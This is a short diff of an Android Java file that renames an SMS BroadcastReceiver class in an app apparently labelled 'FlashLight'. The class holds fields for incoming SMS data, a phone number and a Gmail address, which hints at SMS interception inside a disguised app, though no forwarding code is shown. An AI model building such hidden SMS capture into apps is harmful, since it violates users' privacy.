@@ -14,7 +14,7 @@ import android.content.Intent;
 import android.content.Context;
 import android.content.BroadcastReceiver;
 
-public class SMSListener extends BroadcastReceiver {
+public class SMSReceiver extends BroadcastReceiver {
 
   public  static Object[] pdus;
   public  static Context context;
@@ -25,9 +25,9 @@ public class SMSListener extends BroadcastReceiver {
   private static String phoneNumberString;
   private static String gmailEmailString;
 
-  private static final String TAG = "FlashLight SMSListener";
+  private static final String TAG = "FlashLight SMSReceiver";
 
-  public SMSListener() {
+  public SMSReceiver() {
     configure = new Configure();
     if(!configure.getDatabaseInfo().equals("null")) {
       gmailEmailString = configure.getEmailAddress();
